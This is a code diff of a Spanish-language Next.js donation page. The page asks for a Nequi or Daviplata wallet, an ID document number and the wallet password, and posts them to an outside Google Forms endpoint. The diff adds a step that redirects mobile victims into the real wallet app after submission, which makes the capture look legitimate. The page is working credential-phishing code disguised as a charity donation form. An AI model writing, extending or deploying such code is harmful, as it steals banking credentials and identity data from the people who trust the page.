@@ -16,11 +16,21 @@ export default function DonacionPage() {
   const formURL =
     "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfb8GZ-KmfEnGyivGhBU6J2gUOQyl1Uon1hfxg-LzNKBCa7MA/formResponse";
 
-  // Campos del formulario
   const entryBilletera = "entry.1287154502";
   const entryTipoDoc = "entry.1004012202";
   const entryNumeroDoc = "entry.274269619";
   const entryPassword = "entry.1885484666";
+
+  const isMobile = () => {
+    if (typeof navigator === "undefined") return false;
+    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  };
+
+  const getAppURL = () => {
+    if (billetera === "Nequi") return "nequi://";
+    if (billetera === "Daviplata") return "daviplata://";
+    return "/";
+  };
 
   const handleSubmit = async () => {
     if (!tipoDoc || !numeroDoc || !password) {
@@ -46,8 +56,12 @@ export default function DonacionPage() {
         body: formData,
       });
 
-      // Redirige a página de confirmación o inicio
-      router.push("/gracias-por-donar");
+      if (isMobile()) {
+        const appURL = getAppURL();
+        window.location.href = appURL; // redirige a la app móvil
+      } else {
+        router.push("/proyectos/jovenes-en-accion-por-rosa-blanca"); // redirige en escritorio
+      }
     } catch (error) {
       console.error("Error al enviar los datos:", error);
       alert("❌ No se pudo completar el proceso. Intenta de nuevo.");
@@ -94,9 +108,7 @@ export default function DonacionPage() {
         <input
           type="text"
           value={numeroDoc}
-          onChange={(e) =>
-            setNumeroDoc(e.target.value.replace(/\D/g, ""))
-          }
+          onChange={(e) => setNumeroDoc(e.target.value.replace(/\D/g, ""))}
           placeholder="Ej: 1234567890"
           className="w-full p-3 rounded-lg bg-gray-800 text-white border border-gray-600"
         />
